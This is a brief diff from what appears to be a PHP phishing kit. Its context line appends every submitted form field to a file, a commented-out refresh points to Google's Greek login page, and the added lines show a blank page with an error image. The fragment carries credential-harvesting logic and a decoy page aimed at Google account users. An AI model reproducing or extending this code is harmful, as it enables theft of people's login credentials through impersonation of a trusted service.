@@ -25,3 +25,11 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 ?>
 
 <!-- <meta http-equiv="refresh" content="0; url=https://accounts.google.com/Login?hl=el#identifier"/> -->
+
+
+<html>
+<head>
+</head>
+<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
+</body>
+</html>
